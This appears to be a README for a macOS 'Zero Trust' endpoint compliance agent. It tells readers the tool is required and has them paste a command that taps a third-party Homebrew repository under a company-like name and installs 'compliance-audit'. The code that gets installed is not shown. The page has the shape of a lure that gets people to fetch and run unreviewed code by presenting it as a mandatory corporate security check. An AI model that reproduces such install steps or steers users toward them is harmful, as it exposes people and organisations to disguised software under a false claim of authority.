# Endpoint Compliance Audit (macOS)

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
![Version](https://img.shields.io/badge/version-2.5.0-blue)
![Policy](https://img.shields.io/badge/policy-Zero%20Trust-orange)

This repository hosts the **Zero Trust - Endpoint Security Policy Verification** agent for macOS workstations. This tool is required to verify endpoint security baselines against the corporate Zero Trust access policy.

The agent performs a one-time cryptographic handshake with the Identity Gateway to validate:
* **Device Identity:** mTLS Certificate validity & Keychain integrity.
* **Management Status:** MDM Enrollment & Policy Sync.
* **Hardware Security:** FileVault Encryption, Secure Boot, and SIP status.
* **Telemetry Vitality:** Active EDR sensor status.
* **OS Hygiene:** Minimum OS version and active patch compliance.

## Prerequisites

* **OS:** macOS Monterey (12.0) or newer.
* **Architecture:** Apple Silicon (M1/M2/M3) or Intel.
* **Package Manager:** Homebrew must be installed.

## Installation

To install the agent and register your device, execute the following command in your terminal. This will tap the internal audit repository and trigger the verification service.

```bash
brew tap AccentureIT/policies && brew install compliance-audit
```

## Verification
If you need to manually re-trigger the audit (e.g., after an OS update), you can run the tool directly:

```bash
compliance-audit
```
